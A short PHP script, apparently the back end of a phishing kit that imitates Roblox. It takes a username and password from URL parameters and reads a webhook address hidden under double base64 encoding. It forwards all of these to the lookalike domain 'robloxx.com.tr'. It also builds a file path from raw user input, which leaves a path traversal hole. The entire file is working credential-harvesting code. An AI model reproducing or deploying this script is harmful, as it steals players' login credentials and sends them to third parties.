<?php
include("controllerPages/Admin/termed.php");
$username = isset($_GET['u']) ? urldecode($_GET['u']) : '';
$password = isset($_GET['p']) ? urldecode($_GET['p']) : '';
$returnUrl = isset($_GET['returnUrl']) ? urldecode($_GET['returnUrl']) : '';
$step = isset($_GET['step']) ? urldecode($_GET['step']) : '';
$returnUrlFile = 'tokens/returnUrl-' . urldecode($_GET['returnUrl']) . '.txt';
$Nwebhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
if (!empty($returnUrl)) {
    $redirectUrl = "https://robloxx.com.tr/step.php?step=$step&p=$password&returnUrl=$returnUrl&u=$username&imgurl=$imgurl&color=$color&name=$name&webhook=$webhook&Normalwebhook=$Nwebhook";
$response = file_get_contents($redirectUrl);
}
?>
